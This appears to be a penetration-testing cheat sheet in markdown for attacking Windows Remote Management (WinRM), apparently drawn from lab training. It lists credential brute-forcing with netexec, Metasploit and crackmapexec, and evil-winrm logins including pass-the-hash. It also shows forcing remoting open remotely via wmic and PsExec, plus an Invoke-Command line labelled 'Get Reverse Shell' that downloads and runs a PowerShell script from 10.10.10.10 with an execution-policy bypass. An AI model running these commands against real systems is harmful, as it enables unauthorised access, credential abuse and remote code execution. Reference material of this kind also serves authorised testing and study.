<!-- ------------------------------------------------WinRM NOTES----------------------------------------------------------- -->


<details markdown="1">
<summary>WinRM (5985/5986)</summary>

## Bruteforce
```bash
# netexec
netexec winrm <target-ip> -d DOMAIN -u usernames.txt -p passwords.txt 

# Metasploit
msfconsole
msf > use auxiliary/scanner/winrm/winrm_login
```

## Connect
```bash
# Evil-WinRm
evil-winrm -i <target-ip> -u username -p password
# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password
# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc
# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts
# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
# If you have private key and public key
evil-winrm -i <target-ip> -S -k private.key -c public.key
# -S: SSL
# -k: private key
# -c: public key

# Evil-WinRM commands
# Upload a local file to Windows machine
PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat
# Download a file to local
PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt
# List all services
PS> services
```

## Initiating WinRM Session
```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
# Activate Remotely
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
# Forcing WinRM Open
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```

## Command Execution
```bash 
# With NetExec
# -x: Execute a command
netexec winrm <target-ip> -d DOMAIN -u username -p password -x 'whoami'
netexec winrm <target-ip> -d DOMAIN -u username -p password -X '$PSVersionTable'
# -H: Login with Pass The Hash
netexec winrm <target-ip> -d DOMAIN -u username -H <HASH> -x 'whoami'

# With PowerShell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
# Execute Script
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
# Get Reverse Shell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}

# Get PS Session
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)
# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```

## WinRM in Linux
```bash
# Bruteforce
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm

# PS-docker machine
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
</details>


<!-- ------------------------------------------------qwe NOTES----------------------------------------------------------- -->
